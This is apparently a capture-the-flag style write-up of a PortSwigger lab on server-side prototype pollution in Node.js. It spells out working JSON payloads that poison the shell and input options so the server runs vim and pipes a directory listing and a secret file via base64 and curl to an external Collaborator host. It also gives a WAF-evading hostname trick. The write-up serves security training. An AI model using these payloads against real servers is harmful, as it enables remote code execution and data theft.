# Exfiltrating sensitive data via server-side prototype pollution

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution), you'll learn: Exfiltrating sensitive data via server-side prototype pollution! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab is built on Node.js and the Express framework. It is vulnerable to server-side [prototype pollution](https://portswigger.net/web-security/prototype-pollution) because it unsafely merges user-controllable input into a server-side JavaScript object.

Due to the configuration of the server, it's possible to pollute `Object.prototype` in such a way that you can inject arbitrary system commands that are subsequently executed on the server.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget that you can use to inject and execute arbitrary system commands.
3. Trigger remote execution of a command that leaks the contents of Carlos's home directory (`/home/carlos`) to the public Burp Collaborator server.
4. Exfiltrate the contents of a secret file in this directory to the public Burp Collaborator server.
5. Submit the secret you obtain from the file using the button provided in the lab banner.

In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: `wiener:peter`

> Note:
>  
> When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230222204711.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230222204734.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230222204743.png)

In here, we can update our billing and delivery address.

Let's try to update it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230222204834.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230222204841.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230222204853.png)

When we clicked the "Submit" button, it'll send a POST request to `/my-account/change-address`, with parameter `address_line_1`, `address_line_2`, `city`, `postcode`, `country`, `sessionId` in JSON format:

```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "kJ5BBEPfwN78BsV4ZvujiigEnT5uXHKJ"
}
```

If there's no error, the web application will return a JSON data:

```json
{
    "username": "wiener",
    "firstname": "Peter",
    "lastname": "Wiener",
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "isAdmin": true
}
```

Since we're an administrator, we can access to the admin panel:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230222205031.png)

In here, we can "Run maintenance jobs".

Let's click on that button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230222205054.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230222205105.png)

When we clicked that button, it'll send a POST request to `/admin/jobs`, with parameter `csrf`, `sessionId`, `tasks` in JSON format:

```json
{
    "csrf": "fw5RBBkXNiZjnw6e3MXlSyTXJKfV4Bi3",
    "sessionId": "kJ5BBEPfwN78BsV4ZvujiigEnT5uXHKJ",
    "tasks": [
        "db-cleanup",
        "fs-cleanup"
    ]
}
```

If there's no error, the web application will return a JSON data:

```json
{
    "results": [
        {
            "description": "Database cleanup",
            "name": "db-cleanup",
            "success": true
        },
        {
            "description": "Filesystem cleanup",
            "name": "fs-cleanup",
            "success": true
        }
    ]
}
```

In `/my-account/change-address` endpoint, `POST` or `PUT` requests that submit JSON data to an application or API are prime candidates for this kind of behavior as it's common for servers to respond with a JSON representation of the new or updated object. In this case, you could attempt to pollute the global `Object.prototype` with an arbitrary property via server-side prototype pollution.

### Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`

**To do so, we can use `__proto__` to pollute the global `Object.prototype`, and "JSON spaces override" technique to identify it's really vulnerable to server-side prototype pollution:**
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "kJ5BBEPfwN78BsV4ZvujiigEnT5uXHKJ",
    "__proto__": {
        "json spaces": 1
    }
}
```

**Then, send that payload in `/my-account/change-address`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230222205533.png)

As you can see, the response's JSON data indeed has 1 space for the indentation! Which means the web application is vulnerable to server-side prototype pollution.

### Identify a gadget that you can use to inject and execute arbitrary system commands

In the admin panel, we can run maintenance jobs, which are ***database and filesystem cleanup***.

Database and filesystem cleanup... This got me thinking **it's using OS command to complete that**!

There are a number of potential command execution sinks in Node, many of which occur in the `child_process` module. These are often invoked by a request that occurs asynchronously to the request with which you're able to pollute the prototype in the first place. As a result, the best way to identify these requests is by polluting the prototype with a payload that triggers an interaction with Burp Collaborator when called.

The `NODE_OPTIONS` environment variable enables you to define a string of command-line **arguments** that should be used by default whenever you start a new Node process. As this is also a property on the `env` object, you can potentially control this via prototype pollution if it is undefined.

Some of Node's functions for creating new child processes accept an optional `shell` property, which enables developers to set a specific shell, such as bash, in which to run commands. By combining this with a malicious `NODE_OPTIONS` property, you can pollute the prototype in a way that causes an interaction with Burp Collaborator whenever a new Node process is created:

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

This way, you can easily identify when a request creates a new child process with command-line arguments that are controllable via prototype pollution.

> Tip:
>  
> The escaped double-quotes in the URL aren't strictly necessary. However, this can help to reduce false positives by obfuscating the URL to evade WAFs and other systems that scrape for hostnames.

Moreover, methods such as `child_process.spawn()` and `child_process.fork()` enable developers to create new Node subprocesses. The `fork()` method accepts an options object in which one of the potential options is the `execArgv` property. This is an array of strings containing command-line arguments that should be used when spawning the child process. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution.

As this gadget lets you directly control the command-line arguments, this gives you access to some attack vectors that wouldn't be possible using `NODE_OPTIONS`. Of particular interest is the `--eval` argument, which enables you to pass in arbitrary JavaScript that will be executed by the child process. This can be quite powerful, even enabling you to load additional modules into the environment:

```json
"execArgv": [
    "--eval=require('<module>')"
]
```

In addition to `fork()`, the `child_process` module contains the `execSync()` method, which executes an arbitrary string as a system command. By chaining these JavaScript and [command injection](https://portswigger.net/web-security/os-command-injection) sinks, you can potentially escalate prototype pollution to gain full RCE capability on the server.

However, in some cases, the application may invoke this method of its own accord in order to execute system commands.

Just like `fork()`, the `execSync()` method also accepts options object, which may be pollutable via the prototype chain. Although this doesn't accept an `execArgv` property, you can still inject system commands into a running child process by simultaneously polluting both the `shell` and `input` properties:

- The `input` option is just a string that is passed to the child process's `stdin` stream and executed as a system command by `execSync()`. As there are other options for providing the command, such as simply passing it as an argument to the function, the `input` property itself may be left undefined.
- The `shell` option lets developers declare a specific shell in which they want the command to run. By default, `execSync()` uses the system's default shell to run commands, so this may also be left undefined.

By polluting both of these properties, you may be able to override the command that the application's developers intended to execute and instead run a malicious command in a shell of your choosing. Note that there are a few caveats to this:

- The `shell` option only accepts the name of the shell's executable and does not allow you to set any additional command-line arguments.
- The shell is always executed with the `-c` argument, which most shells use to let you pass in a command as a string. However, setting the `-c` flag in Node instead runs a syntax check on the provided script, which also prevents it from executing. As a result, although there are workarounds for this, it's generally tricky to use Node itself as a shell for your attack.
- As the `input` property containing your payload is passed via `stdin`, the shell you choose must accept commands from `stdin`.

Although they aren't really intended to be shells, the text editors Vim and ex reliably fulfill all of these criteria. If either of these happen to be installed on the server, this creates a potential vector for RCE:

```json
"shell":"vim",
"input":":! <command>\n"
```

> Note:
>  
> Vim has an interactive prompt and expects the user to hit `Enter` to run the provided command. As a result, you need to simulate this by including a newline (`\n`) character at the end of your payload, as shown in the example above.

One additional limitation of this technique is that some tools that you might want to use for your exploit also don't read data from `stdin` by default. However, there are a few simple ways around this. In the case of `curl`, for example, you can read `stdin` and send the contents as the body of a `POST` request using the `-d @-` argument.

In other cases, you can use `xargs`, which converts `stdin` to a list of arguments that can be passed to a command.

### Trigger remote execution of a command that leaks the contents of Carlos's home directory (`/home/carlos`) to the public Burp Collaborator server

Armed with above information, **we can try to exfiltrate sensitive data via polluting the `shell` and `input` properties.**

But first, we need to confirm it's vulnerable to Remote Code Execution (RCE) via server-side prototype pollution.

**Confirm payload:**
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "TSVlnXyRQM0bCY3673SILjpuVbpVg0Ya",
    "__proto__": {
        "shell":"vim",
        "input":":! curl https://2ehqzrpkjm5uif25p2gwfg2rhin9bzzo.oastify.com\n"
    }
}
```

**Send that payload in `/my-account/change-address`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230228210342.png)

**Then, run our polluted maintenance jobs:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230228210349.png)

**Burp Collaborator server:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230228210948.png)

As you can see, we have 2 HTTPS requests! Which can be confirmed **the web application is indeed vulnerable to RCE via serve-side prototype pollution**!

> Note: It made 2 requests is because the maintenance jobs will run twice.

***Next, we can use `base64` and `curl` to exfiltrate data!***
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "TSVlnXyRQM0bCY3673SILjpuVbpVg0Ya",
    "__proto__": {
        "shell":"vim",
        "input":":! ls -lah | base64 | curl -d @- https://2ehqzrpkjm5uif25p2gwfg2rhin9bzzo.oastify.com\n"
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230228211022.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230228211032.png)

**Burp Collaborator server:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230228211135.png)

Nice! Let's `base64` decode that!

```shell
┌[siunam♥earth]-(~/ctf/Portswigger-Labs/Prototype-Pollution)-[2023.02.28|21:12:10(HKT)]
└> echo 'dG90YWwgMjBLCmRyd3hyLXhyLXggMSBjYXJsb3MgY2FybG9zICAgNjkgRmViIDI4IDEzOjAyIC4KZHJ3eHIteHIteCAxIHJvb3QgICByb290ICAgICAyMCBGZWIgMjQgMDI6MDkgLi4KLXJ3LXItLXItLSAxIGNhcmxvcyBjYXJsb3MgIDIyMCBGZWIgMjUgIDIwMjAgLmJhc2hfbG9nb3V0Ci1ydy1yLS1yLS0gMSBjYXJsb3MgY2FybG9zIDMuN0sgRmViIDI1ICAyMDIwIC5iYXNocmMKZHJ3eC0tLS0tLSA0IGNhcmxvcyBjYXJsb3MgICA5NCBGZWIgMjggMTI6NTcgLmZvcmV2ZXIKLXJ3LXItLXItLSAxIGNhcmxvcyBjYXJsb3MgIDgwNyBGZWIgMjUgIDIwMjAgLnByb2ZpbGUKLXJ3LS0tLS0tLSAxIGNhcmxvcyBjYXJsb3MgIDY3MyBGZWIgMjggMTM6MDIgLnZpbWluZm8KZHJ3eHJ3eHIteCAyIGNhcmxvcyBjYXJsb3MgICA2NCBGZWIgMjggMTI6NTcgbm9kZV9hcHBzCi1ydy1ydy1yLS0gMSBjYXJsb3MgY2FybG9zICAgMzIgRmViIDI4IDEyOjU3IHNlY3JldAo=' | base64 -d
total 20K
drwxr-xr-x 1 carlos carlos   69 Feb 28 13:02 .
drwxr-xr-x 1 root   root     20 Feb 24 02:09 ..
-rw-r--r-- 1 carlos carlos  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 carlos carlos 3.7K Feb 25  2020 .bashrc
drwx------ 4 carlos carlos   94 Feb 28 12:57 .forever
-rw-r--r-- 1 carlos carlos  807 Feb 25  2020 .profile
-rw------- 1 carlos carlos  673 Feb 28 13:02 .viminfo
drwxrwxr-x 2 carlos carlos   64 Feb 28 12:57 node_apps
-rw-rw-r-- 1 carlos carlos   32 Feb 28 12:57 secret
```

We successfully exfiltrated the home directory of user `carlos`!

### Exfiltrate the contents of a secret file in this directory to the public Burp Collaborator server

**Let's exfiltrate the `secret` file:**
```json
{
    "address_line_1": "Wiener HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "TSVlnXyRQM0bCY3673SILjpuVbpVg0Ya",
    "__proto__": {
        "shell":"vim",
        "input":":! cat secret | base64 | curl -d @- https://2ehqzrpkjm5uif25p2gwfg2rhin9bzzo.oastify.com\n"
    }
}
```

**Send that payload in `/my-account/change-address`, run our polluted maintenance jobs, Go to the Collaborator tab and poll for interactions:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230228211504.png)

**Decode that:**
```shell
┌[siunam♥earth]-(~/ctf/Portswigger-Labs/Prototype-Pollution)-[2023.02.28|21:12:17(HKT)]
└> echo 'SUc4bU9vRnhsZmk5bENkWXN4RTRUZXVabVkxSTlZdGE=' | base64 -d
IG8mOoFxlfi9lCdYsxE4TeuZmY1I9Yta
```

Nice! We can finally submit that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230228211533.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Prototype-Pollution/Prototype-10/images/Pasted%20image%2020230228211549.png)

# What we've learned:

1. Exfiltrating sensitive data via server-side prototype pollution